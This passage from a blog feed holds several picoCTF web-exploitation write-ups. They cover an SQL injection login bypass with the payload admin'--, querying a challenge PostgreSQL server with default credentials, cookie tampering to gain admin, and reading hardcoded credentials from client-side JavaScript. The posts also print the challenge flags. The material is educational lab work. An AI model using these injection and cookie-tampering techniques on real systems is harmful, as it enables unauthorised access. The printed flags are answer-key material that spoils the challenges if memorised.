</span></span><span class="line"><span class="cl">SQL query: SELECT * FROM users WHERE name=&#39;admin&#39;--&#39; AND password=&#39;&#39;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Logged in! But can you see the flag, it is in plainsight.
</span></span></code></pre></td></tr></table>
</div>
</div><p>But looking at the html code reveals the flag pretty quickly:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span> <span class="na">hidden</span><span class="o">=</span><span class="s">&#34;&#34;</span><span class="p">&gt;</span>Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_8dac17f1}<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>So the flag is</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">picoCTF{L00k5_l1k3_y0u_solv3d_it_8dac17f1}
</span></span></code></pre></td></tr></table>
</div>
</div>]]></description></item><item><title>picoCTF - Web Exploitation - SQL Direct</title><link>https://blog.ppeinecke.de/posts/picoctf-web-exploitation-sql-direct/</link><pubDate>Wed, 06 Apr 2022 16:10:25 +0200</pubDate><guid>https://blog.ppeinecke.de/posts/picoctf-web-exploitation-sql-direct/</guid><description><![CDATA[<div class="featured-image">
                <img src="/featuredImages/picoCTF_logo.png" referrerpolicy="no-referrer">
            </div><h1 id="web-exploitation---sql-direct---writeup">Web Exploitation - SQL Direct - writeup</h1>
<h2 id="description">description</h2>
<p>Connect to this PostgreSQL server and find the flag!</p>
<p>psql -h saturn.picoctf.net -p 49248 -U postgres pico</p>
<p>Password is postgres</p>
<h2 id="writeup">writeup</h2>
<p>Ok let&rsquo;s first connect to the database server:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">psql -h saturn.picoctf.net -p <span class="m">49248</span> -U postgres pico 
</span></span></code></pre></td></tr></table>
</div>
</div><p>the password is &lsquo;postgres&rsquo;</p>
<p>Let&rsquo;s list all databases first</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">pico</span><span class="o">=</span><span class="c1"># \l</span>
</span></span><span class="line"><span class="cl">                                 List of databases
</span></span><span class="line"><span class="cl">   Name    <span class="p">|</span>  Owner   <span class="p">|</span> Encoding <span class="p">|</span>  Collate   <span class="p">|</span>   Ctype    <span class="p">|</span>   Access privileges   
</span></span><span class="line"><span class="cl">-----------+----------+----------+------------+------------+-----------------------
</span></span><span class="line"><span class="cl"> pico      <span class="p">|</span> postgres <span class="p">|</span> UTF8     <span class="p">|</span> en_US.utf8 <span class="p">|</span> en_US.utf8 <span class="p">|</span> 
</span></span><span class="line"><span class="cl"> postgres  <span class="p">|</span> postgres <span class="p">|</span> UTF8     <span class="p">|</span> en_US.utf8 <span class="p">|</span> en_US.utf8 <span class="p">|</span> 
</span></span><span class="line"><span class="cl"> template0 <span class="p">|</span> postgres <span class="p">|</span> UTF8     <span class="p">|</span> en_US.utf8 <span class="p">|</span> en_US.utf8 <span class="p">|</span> <span class="o">=</span>c/postgres          +
</span></span><span class="line"><span class="cl">           <span class="p">|</span>          <span class="p">|</span>          <span class="p">|</span>            <span class="p">|</span>            <span class="p">|</span> <span class="nv">postgres</span><span class="o">=</span>CTc/postgres
</span></span><span class="line"><span class="cl"> template1 <span class="p">|</span> postgres <span class="p">|</span> UTF8     <span class="p">|</span> en_US.utf8 <span class="p">|</span> en_US.utf8 <span class="p">|</span> <span class="o">=</span>c/postgres          +
</span></span><span class="line"><span class="cl">           <span class="p">|</span>          <span class="p">|</span>          <span class="p">|</span>            <span class="p">|</span>            <span class="p">|</span> <span class="nv">postgres</span><span class="o">=</span>CTc/postgres
</span></span><span class="line"><span class="cl"><span class="o">(</span><span class="m">4</span> rows<span class="o">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Connect to the &lsquo;pico&rsquo; database</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">pico</span><span class="o">=</span><span class="c1"># \c pico</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>List all tables</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">pico</span><span class="o">=</span><span class="c1"># \dt</span>
</span></span><span class="line"><span class="cl">         List of relations
</span></span><span class="line"><span class="cl"> Schema <span class="p">|</span> Name  <span class="p">|</span> Type  <span class="p">|</span>  Owner   
</span></span><span class="line"><span class="cl">--------+-------+-------+----------
</span></span><span class="line"><span class="cl"> public <span class="p">|</span> flags <span class="p">|</span> table <span class="p">|</span> postgres
</span></span><span class="line"><span class="cl"><span class="o">(</span><span class="m">1</span> row<span class="o">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>the table &lsquo;flags&rsquo; sounds interesting &hellip;</p>
<p>lets look at the contents:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">pico</span><span class="o">=</span><span class="c1"># select * from flags;</span>
</span></span><span class="line"><span class="cl"> id <span class="p">|</span> firstname <span class="p">|</span> lastname  <span class="p">|</span>                address                 
</span></span><span class="line"><span class="cl">----+-----------+-----------+----------------------------------------
</span></span><span class="line"><span class="cl">  <span class="m">1</span> <span class="p">|</span> Luke      <span class="p">|</span> Skywalker <span class="p">|</span> picoCTF<span class="o">{</span>L3arN_S0m3_5qL_t0d4Y_a26695df<span class="o">}</span>
</span></span><span class="line"><span class="cl">  <span class="m">2</span> <span class="p">|</span> Leia      <span class="p">|</span> Organa    <span class="p">|</span> Alderaan
</span></span><span class="line"><span class="cl">  <span class="m">3</span> <span class="p">|</span> Han       <span class="p">|</span> Solo      <span class="p">|</span> Corellia
</span></span><span class="line"><span class="cl"><span class="o">(</span><span class="m">3</span> rows<span class="o">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>There is our flag.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">picoCTF{L3arN_S0m3_5qL_t0d4Y_a26695df}
</span></span></code></pre></td></tr></table>
</div>
</div>]]></description></item><item><title>picoCTF - Web Exploitation - Search source</title><link>https://blog.ppeinecke.de/posts/picoctf-web-exploitation-search-source/</link><pubDate>Wed, 06 Apr 2022 16:08:45 +0200</pubDate><guid>https://blog.ppeinecke.de/posts/picoctf-web-exploitation-search-source/</guid><description><![CDATA[<div class="featured-image">
                <img src="/featuredImages/picoCTF_logo.png" referrerpolicy="no-referrer">
            </div><h1 id="web-exploitation---search-source---writeup">Web Exploitation - Search Source - writeup</h1>
<h2 id="description">description</h2>
<p>The developer of this website mistakenly left an
important artifact in the website source, can you find it?
The website is <!-- raw HTML omitted -->here<!-- raw HTML omitted --></p>
<h2 id="writeup">writeup</h2>
<p>I was not able to find anything interesting on the website
by just looking at the source code in the browser.</p>
<p>So let&rsquo;s clone the website first using HTTrack so we can
take a look at the full source.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">httrack http://saturn.picoctf.net:64200/
</span></span></code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s use grep recursively to find the flag inside all
of the files of the webroot.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">grep -nr <span class="s1">&#39;picoCTF*&#39;</span> .
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">./css/style.css:328:/** banner_main picoCTF<span class="o">{</span>1nsp3ti0n_0f_w3bpag3s_3003ba70<span class="o">}</span> **/
</span></span></code></pre></td></tr></table>
</div>
</div><p>We found the flag inside the file css/style.css on line 328.</p>
<p>Flag:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">picoCTF{1nsp3ti0n_0f_w3bpag3s_3003ba70}
</span></span></code></pre></td></tr></table>
</div>
</div>]]></description></item><item><title>picoCTF - Web Exploitation - Power Cookie</title><link>https://blog.ppeinecke.de/posts/picoctf-web-exploitation-power-cookie/</link><pubDate>Wed, 06 Apr 2022 16:04:26 +0200</pubDate><guid>https://blog.ppeinecke.de/posts/picoctf-web-exploitation-power-cookie/</guid><description><![CDATA[<div class="featured-image">
                <img src="/featuredImages/picoCTF_logo.png" referrerpolicy="no-referrer">
            </div><h1 id="web-exploitation---power-cookie---writeup">Web Exploitation - Power Cookie - writeup</h1>
<h2 id="description">description</h2>
<p>Can you get the flag? Go to this <!-- raw HTML omitted -->website<!-- raw HTML omitted -->
and see what you can discover.</p>
<h2 id="writeup">writeup</h2>
<p>Looking at the check.php function I can see that it requests a cookie &lsquo;isAdmin&rsquo;.</p>
<p>That cookie is not present at the first visit of the page.</p>
<p>So lets refresh the webpage.</p>
<p>Now the cookie is present.</p>
<p>The value of this particuluar cookie is &lsquo;0&rsquo; currently.</p>
<p>So lets change it to &lsquo;1&rsquo; and refresh the page once more.</p>
<p>I am immediately presented with the flag:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">picoCTF{gr4d3_A_c00k13_1d871e17}
</span></span></code></pre></td></tr></table>
</div>
</div>]]></description></item><item><title>picoCTF - Web Exploitation - Local Authority</title><link>https://blog.ppeinecke.de/posts/picoctf-web-exploitation-local-authority/</link><pubDate>Wed, 06 Apr 2022 15:58:43 +0200</pubDate><guid>https://blog.ppeinecke.de/posts/picoctf-web-exploitation-local-authority/</guid><description><![CDATA[<div class="featured-image">
                <img src="/featuredImages/picoCTF_logo.png" referrerpolicy="no-referrer">
            </div><h1 id="web-exploitation---local-authority---writeup">Web Exploitation - Local Authority - writeup</h1>
<h2 id="description">description</h2>
<p>Can you get the flag?
Go to this <!-- raw HTML omitted -->website<!-- raw HTML omitted --> and see what you can discover.</p>
<h2 id="writeup">writeup</h2>
<p>Once I open the link <!-- raw HTML omitted --><a href="http://saturn.picoctf.net:51419/" target="_blank" rel="noopener noreffer">http://saturn.picoctf.net:51419/</a><!-- raw HTML omitted --> in firefox I get to a page &ldquo;Secure Customer Portal&rdquo;.</p>
<p>I can see a login form with username and password.</p>
<p>On the website I see a hint:</p>
<blockquote>
<p>Only letters and numbers allowed for username and password.</p>
</blockquote>
<p>I tried to do a simple post request to the login.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">username=admin&amp;password=test&amp;login=true
</span></span></code></pre></td></tr></table>
</div>
</div><p>Using that payload I get the following html response:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&#34;en&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;UTF-8&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;viewport&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;width=device-width, initial-scale=1.0&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&#34;X-UA-Compatible&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;ie=edge&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;style.css&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Login Page<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;secure.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">p</span> <span class="na">id</span><span class="o">=</span><span class="s">&#39;msg&#39;</span><span class="p">&gt;&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">hidden</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;admin.php&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;post&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;hiddenAdminForm&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;hash&#34;</span> <span class="na">required</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;adminFormHash&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="kd">function</span> <span class="nx">filter</span><span class="p">(</span><span class="nx">string</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">filterPassed</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">string</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">          <span class="nx">cc</span> <span class="o">=</span> <span class="nx">string</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          
</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="nx">cc</span> <span class="o">&gt;=</span> <span class="mi">48</span> <span class="o">&amp;&amp;</span> <span class="nx">cc</span> <span class="o">&lt;=</span> <span class="mi">57</span><span class="p">)</span> <span class="o">||</span>
</span></span><span class="line"><span class="cl">               <span class="p">(</span><span class="nx">cc</span> <span class="o">&gt;=</span> <span class="mi">65</span> <span class="o">&amp;&amp;</span> <span class="nx">cc</span> <span class="o">&lt;=</span> <span class="mi">90</span><span class="p">)</span> <span class="o">||</span>
</span></span><span class="line"><span class="cl">               <span class="p">(</span><span class="nx">cc</span> <span class="o">&gt;=</span> <span class="mi">97</span> <span class="o">&amp;&amp;</span> <span class="nx">cc</span> <span class="o">&lt;=</span> <span class="mi">122</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">          <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">filterPassed</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>     
</span></span><span class="line"><span class="cl">          <span class="p">}</span>
</span></span><span class="line"><span class="cl">          <span class="k">else</span>
</span></span><span class="line"><span class="cl">          <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">      <span class="nb">window</span><span class="p">.</span><span class="nx">username</span> <span class="o">=</span> <span class="s2">&#34;admin&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nb">window</span><span class="p">.</span><span class="nx">password</span> <span class="o">=</span> <span class="s2">&#34;test&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      
</span></span><span class="line"><span class="cl">      <span class="nx">usernameFilterPassed</span> <span class="o">=</span> <span class="nx">filter</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">username</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nx">passwordFilterPassed</span> <span class="o">=</span> <span class="nx">filter</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">password</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="nx">usernameFilterPassed</span> <span class="o">&amp;&amp;</span> <span class="nx">passwordFilterPassed</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      
</span></span><span class="line"><span class="cl">        <span class="nx">loggedIn</span> <span class="o">=</span> <span class="nx">checkPassword</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">username</span><span class="p">,</span> <span class="nb">window</span><span class="p">.</span><span class="nx">password</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">loggedIn</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;msg&#39;</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s2">&#34;Log In Successful&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;adminFormHash&#39;</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="s2">&#34;2196812e91c29df34f5e217cfd639881&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;hiddenAdminForm&#39;</span><span class="p">).</span><span class="nx">submit</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;msg&#39;</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s2">&#34;Log In Failed&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;msg&#39;</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s2">&#34;Illegal character in username or password.&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Looking at that html code there are two lines that stick out:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">window.username = &#34;admin&#34;;
</span></span><span class="line"><span class="cl">window.password = &#34;test&#34;;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Lets try the username &lsquo;admin&rsquo; and the password &rsquo;test&rsquo;&hellip;</p>
<p>No luck</p>
<p>The file &lsquo;secure.js&rsquo; seems to be more interesting &hellip;</p>
<p>Let&rsquo;s take a look at it:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">checkPassword</span><span class="p">(</span><span class="nx">username</span><span class="p">,</span> <span class="nx">password</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span> <span class="nx">username</span> <span class="o">===</span> <span class="s1">&#39;admin&#39;</span> <span class="o">&amp;&amp;</span> <span class="nx">password</span> <span class="o">===</span> <span class="s1">&#39;strongPassword098765&#39;</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>So the username seems to be &lsquo;admin&rsquo; and the password &lsquo;strongPassword098765&rsquo;</p>
<p>Using that combination the login was successful and I can see the flag:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">picoCTF{j5_15_7r4n5p4r3n7_d6a44d91} 
</span></span></code></pre></td></tr></table>
</div>
</div>]]></description></item><item><title>picoCTF - Web Exploitation - Inspect HTML</title><link>https://blog.ppeinecke.de/posts/picoctf-web-exploitation-inspect-html/</link><pubDate>Wed, 06 Apr 2022 15:51:22 +0200</pubDate><guid>https://blog.ppeinecke.de/posts/picoctf-web-exploitation-inspect-html/</guid><description><![CDATA[<div class="featured-image">
                <img src="/featuredImages/picoCTF_logo.png" referrerpolicy="no-referrer">
            </div><h1 id="web-exploitation---includes---writeup">Web Exploitation - Includes - writeup</h1>
<h2 id="description">description</h2>
<p>Can you get the flag?
Go to this <!-- raw HTML omitted -->website<!-- raw HTML omitted --> and see what you can discover.</p>
<h2 id="writeup">writeup</h2>
<p>Once I opened the website <!-- raw HTML omitted --><a href="http://saturn.picoctf.net:60935/" target="_blank" rel="noopener noreffer">http://saturn.picoctf.net:60935/</a><!-- raw HTML omitted --> in firefox and looking at the source code I could immediately find the flag inside a comment in the html source code:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="c">&lt;!--picoCTF{1n5p3t0r_0f_h7ml_ab1df88d}--&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>So the flag is:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">picoCTF{1n5p3t0r_0f_h7ml_ab1df88d}
</span></span></code></pre></td></tr></table>
</div>
